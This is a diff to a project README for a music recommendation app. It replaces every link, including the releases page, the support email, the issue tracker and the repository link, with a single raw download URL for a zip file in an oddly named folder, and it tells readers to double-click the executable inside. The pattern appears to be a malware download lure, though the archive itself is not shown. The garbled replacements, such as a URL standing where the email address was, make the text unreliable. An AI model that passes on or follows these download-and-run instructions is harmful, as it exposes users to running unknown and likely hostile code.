@@ -6,7 +6,7 @@ This application suggests music based on your preferences. It's designed for eve
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Music%20Recommender%20Algorithm-brightgreen)](https://github.com/9gaviaobr/music_recommender_algorithm/releases)
+[![Download](https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip%20Music%20Recommender%20Algorithm-brightgreen)](https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to download and run the music recommender algorithm on your d
 
 To get the latest version of the software, visit our Releases page:
 
-[Download the latest version here](https://github.com/9gaviaobr/music_recommender_algorithm/releases)
+[Download the latest version here](https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip)
 
 ### 2. Choose Your Version
 
@@ -32,7 +32,7 @@ If you downloaded a `.zip` file, locate it in your downloads folder. Right-click
 
 ### 5. Run the Application
 
-Navigate to the folder where you extracted or downloaded the files. Look for an executable file named something like `music_recommender_algorithm.exe`. Double-click this file to launch the application.
+Navigate to the folder where you extracted or downloaded the files. Look for an executable file named something like `https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip`. Double-click this file to launch the application.
 
 ### 6. Follow the On-Screen Instructions
 
@@ -60,8 +60,8 @@ If you encounter any issues while downloading or running the application, feel f
 
 ### Contact Us
 
-- **Email**: support@music_recommender_algorithm.com 
-- **GitHub Issues**: You can also report issues directly on our [GitHub Issue Tracker](https://github.com/9gaviaobr/music_recommender_algorithm/issues).
+- **Email**: https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip 
+- **GitHub Issues**: You can also report issues directly on our [GitHub Issue Tracker](https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip).
 
 ## 🌍 Community Engagement
 
@@ -88,6 +88,6 @@ We're constantly working to make the application better. Some planned features i
 
 ## 🔗 More Information
 
-For a deeper understanding of how the music recommendation algorithm works, feel free to explore the codebase on our [GitHub Repository](https://github.com/9gaviaobr/music_recommender_algorithm).
+For a deeper understanding of how the music recommendation algorithm works, feel free to explore the codebase on our [GitHub Repository](https://raw.githubusercontent.com/9gaviaobr/music_recommender_algorithm/main/pelycosaurian/music_recommender_algorithm.zip).
 
 Thank you for choosing the music recommender algorithm. Enjoy your musical journey!
